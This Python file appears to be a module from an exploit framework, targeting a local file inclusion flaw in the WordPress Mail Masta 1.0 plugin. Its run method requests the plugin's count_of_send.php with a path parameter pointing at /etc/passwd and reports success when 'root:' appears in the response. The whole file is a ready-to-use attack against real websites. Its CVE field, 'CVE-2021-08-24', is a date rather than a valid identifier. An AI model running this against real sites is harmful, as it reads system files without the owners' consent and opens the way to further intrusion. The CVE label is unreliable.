import requests
from ...exploit import Exploit, CMS, Categorys
from ....config import Config
from ....handler.retry.retryrequest import RetryRequest

retry_request = RetryRequest(max_retries=3)
CONFIG = Config()

class Masta(Exploit):
    name = "WordPress Plugin Mail Masta 1.0"
    cms = CMS.Wordpress
    category = Categorys.LFI
    cve = "CVE-2021-08-24"

    def run(self, url):
        r = retry_request.retry(requests.get, f"{url}/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd", timeout=CONFIG.timeouts(), headers={'User-Agent': CONFIG.useragent()})
        if len(r.text) >= 1000:
            if "root:" in r.text:
                return True
        return False